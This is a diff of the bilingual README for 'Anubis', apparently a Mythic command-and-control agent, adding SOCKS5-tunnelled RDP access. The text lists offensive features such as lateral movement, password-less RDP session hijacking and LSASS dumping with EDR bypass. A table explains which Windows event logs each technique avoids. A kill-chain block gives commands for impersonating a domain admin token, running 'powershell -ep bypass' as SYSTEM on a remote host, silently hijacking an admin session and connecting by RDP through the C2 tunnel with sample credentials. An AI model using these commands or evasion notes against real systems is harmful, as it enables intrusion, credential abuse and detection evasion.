@@ -29,6 +29,7 @@ Na mitologia egípcia, Anúbis era o guardião das passagens entre mundos. Aqui 
 | WMI lateral movement | Remote exec via COM vtable — no wmic.exe (T1047) | Execução remota WMI sem wmic.exe (T1047) |
 | SCM lateral movement | Remote SYSTEM exec via Service Control Manager — no sc.exe (T1021.002) | Execução SYSTEM via SCM sem sc.exe (T1021.002) |
 | RDP session hijacking | Hijack disconnected/active sessions without password (T1563.002) | Hijack sessões RDP sem senha (T1563.002) |
+| RDP external access | SOCKS5-tunneled RDP via xfreerdp/rdesktop — no proxychains needed (T1021.001) | RDP via tunnel SOCKS5 com xfreerdp nativo — sem proxychains |
 | LSASS dump | NtCreateProcessEx fork evasion (EDR bypass) | Evasão via fork NtCreateProcessEx (bypass EDR) |
 | Shellcode injection | VirtualAllocEx + CRT via process browser | Injeção via process browser do Mythic |
 | Screenshot | Pure ctypes GDI32/User32 — no pywin32 or Pillow | ctypes puro — sem pywin32 ou Pillow |
@@ -189,25 +190,30 @@ sudo ./mythic-cli install github https://github.com/wtechsec/Anubis.git
 | wmi_exec | No wmic.exe spawned; generates WMI activity log on target (Microsoft-Windows-WMI-Activity/Operational) | Sem wmic.exe; gera log WMI no alvo |
 | sc_exec | Generates EID 7045 (service created) on target — service name is randomized | Gera EID 7045 no alvo; nome do serviço é randômico |
 | rdp_hijack | Disconnected session hijack generates no EID 4624; only EID 4778 if logon audit enabled | Hijack de sessão desconectada não gera EID 4624 |
+| rdp_ext | SOCKS5 traffic blends with existing C2 channel; xfreerdp native proxy avoids proxychains artifacts | Tráfego RDP no canal C2 existente; xfreerdp nativo evita artefatos do proxychains |
 
 ---
 
 ## Lateral Movement Kill Chain
 
 ```
-# Token Impersonation → WMI → SCM → RDP Hijack
+# Token Impersonation → WMI → SCM → RDP Hijack + External RDP
 
 token_steal                          # List tokens from running processes
 token_steal 1884                     # Impersonate domain admin token (no logon event)
 
 wmi_exec 10.12.193.4 "whoami"        # Validate lateral access via WMI (no wmic.exe)
 
-sc_exec 10.12.193.4 \               # Deploy Anubis as SYSTEM on lateral host
+sc_exec 10.12.193.4 \                # Deploy Anubis as SYSTEM on lateral host
   "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
 
 # On new SYSTEM agent at 10.12.193.4:
 rdp_hijack                           # List RDP sessions
-rdp_hijack 3                         # Hijack disconnected domain admin session
+rdp_hijack 3                         # Hijack disconnected domain admin session (silent)
+
+# External RDP via SOCKS5 tunnel (from Kali, no proxychains needed):
+rdp_ext 10.12.193.4 Administrator P@ssw0rd COPEL
+# → xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4 /u:Administrator /d:COPEL ...
 ```
 
 ---
